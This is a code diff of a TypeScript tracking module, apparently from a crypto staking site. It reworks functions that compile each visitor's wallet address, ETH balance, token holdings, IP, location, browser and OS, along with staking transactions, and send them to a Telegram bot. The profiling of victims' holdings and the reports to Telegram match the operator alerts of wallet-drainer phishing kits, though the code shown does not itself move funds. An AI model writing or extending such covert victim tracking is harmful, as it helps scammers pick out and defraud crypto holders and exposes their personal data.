@@ -176,33 +176,72 @@ export async function trackPageExit(data: any): Promise<boolean> {
 }
 
 // Simple function to track wallet connections
-export async function trackWalletConnection(data: any): Promise<boolean> {
+export async function trackWalletConnection(data: {
+  address: string
+  balance: string
+  walletType: string
+  success: boolean
+  disconnected?: boolean
+  error?: string
+  ip?: string
+  country?: string
+  city?: string
+  referer?: string
+  userAgent?: string
+  browser?: string
+  os?: string
+  tokenHoldings?: Record<string, string>
+  isMobile?: boolean
+  etherscanLink?: string
+}): Promise<boolean> {
   try {
-    let message = data.success
-      ? `
-🔌 WALLET CONNECTED
-👤 Address: ${data.address}
-💰 Balance: ${data.balance} ETH
-🔑 Wallet Type: ${data.walletType || "Unknown"}
-`
-      : `
-❌ WALLET CONNECTION REJECTED
-🔑 Wallet Type: ${data.walletType || "Unknown"}
-⚠️ Error: ${data.error || "User rejected request"}
-`
+    console.log("Tracking wallet connection:", data)
 
-    message += `
-🌐 IP: ${data.ip || "Unknown"}
-🌍 Location: ${data.country || "Unknown"}${data.city ? `, ${data.city}` : ""}
-🌐 Browser: ${data.browser || "Unknown"}
-💻 OS: ${data.os || "Unknown"}
-🔗 Referrer: ${data.referer || "Direct"}
-⏰ Time: ${new Date().toISOString()}
-`
+    // Format the message with HTML for Telegram
+    let message = `🔌 Wallet ${data.success ? "Connected" : data.disconnected ? "Disconnected" : "Connection Failed"}\n\n`
 
+    if (data.address) {
+      // Add Etherscan link if available
+      if (data.etherscanLink) {
+        message += `👛 Address: <a href="${data.etherscanLink}">${data.address}</a>\n`
+      } else {
+        message += `👛 Address: ${data.address}\n`
+        // Add a default Etherscan link if address is valid
+        if (data.address.startsWith("0x") && data.address.length === 42) {
+          message += `🔍 <a href="https://etherscan.io/address/${data.address}">View on Etherscan</a>\n`
+        }
+      }
+    }
+
+    message += `💰 Balance: ${data.balance} ETH\n`
+    message += `🔑 Wallet: ${data.walletType}\n`
+
+    if (data.tokenHoldings && Object.keys(data.tokenHoldings).length > 0) {
+      message += `\n💎 Token Holdings:\n`
+      for (const [token, amount] of Object.entries(data.tokenHoldings)) {
+        if (token !== "ETH" && Number.parseFloat(amount) > 0) {
+          message += `- ${token}: ${amount}\n`
+        }
+      }
+    }
+
+    if (data.ip) message += `\n🌐 IP: ${data.ip}\n`
+    if (data.country) message += `📍 Location: ${data.country}${data.city ? `, ${data.city}` : ""}\n`
+    if (data.browser) message += `🌍 Browser: ${data.browser}\n`
+    if (data.os) message += `💻 OS: ${data.os}\n`
+    if (data.isMobile !== undefined) message += `📱 Mobile: ${data.isMobile ? "Yes" : "No"}\n`
+    if (data.referer) message += `🔄 Referrer: ${data.referer}\n`
+
+    if (data.error) {
+      message += `\n❌ Error: ${data.error}\n`
+    }
+
+    message += `\n⏰ Time: ${new Date().toISOString()}`
+
+    // Send the message directly to Telegram API
     return await sendTelegramNotification(message)
   } catch (error) {
-    console.error("Error tracking wallet connection:", error)
+    console.error("Error sending wallet connection notification:", error)
     return false
   }
 }
@@ -214,13 +253,15 @@ export async function trackStakingEvent(data: any): Promise<boolean> {
       ? `
 💰 STAKING TRANSACTION SENT
 👤 Address: ${data.address}
+${data.etherscanLink ? `🔍 <a href="${data.etherscanLink}">View on Etherscan</a>` : ""}
 📊 Amount: ${data.amount} ETH
-🧾 Transaction: ${data.txHash || "N/A"}
+🧾 Transaction: ${data.txHash ? `<a href="https://etherscan.io/tx/${data.txHash}">View Transaction</a>` : "N/A"}
 ⛽ Gas Price: ${data.gasPrice || "Unknown"} gwei
 `
       : `
 ❌ STAKING FAILED
 👤 Address: ${data.address}
+${data.etherscanLink ? `🔍 <a href="${data.etherscanLink}">View on Etherscan</a>` : ""}
 📊 Attempted Amount: ${data.amount} ETH
 ⚠️ Error: ${data.error || "Unknown error"}
 `
